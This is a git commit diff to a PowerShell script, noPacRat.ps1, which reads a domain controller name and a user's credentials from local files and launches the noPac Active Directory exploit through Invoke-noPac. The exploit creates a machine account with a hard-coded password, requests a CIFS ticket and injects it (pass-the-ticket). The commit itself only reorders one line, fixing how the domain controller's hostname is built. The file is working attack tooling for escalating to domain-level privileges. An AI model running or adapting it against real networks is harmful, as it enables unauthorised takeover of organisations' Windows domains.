7d07049b6a59dd1c35fcf7abd7f06b8913a09e01
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-03-20 18:14:03 -0400

    Update noPacRat.ps1

--- noPacRat/noPacRat.ps1
+++ noPacRat/noPacRat.ps1
@@ -9,9 +9,9 @@ $DC = Get-Content .\DC.txt | select -Index 3
 $DC |Foreach {$_.TrimEnd()} | Set-Content DC.txt
 $DC.TrimEnd() > .\DC.txt
 $DC = Get-Content .\DC.txt
-$DCvar = "$DC.$domain"
 $username = Get-Content .\username.txt -First 1
 $password = Get-Content .\password.txt -First 1
 $domain = (gwmi win32_computersystem).Domain
+$DCvar = "$DC.$domain"
 import-module .\Invoke-noPac.ps1
 Invoke-noPac "-domain $domain -user $username -pass $password /enctype rc4 /dc $DCvar /mAccount newmachine /mPassword Password123 /service cifs /ptt"
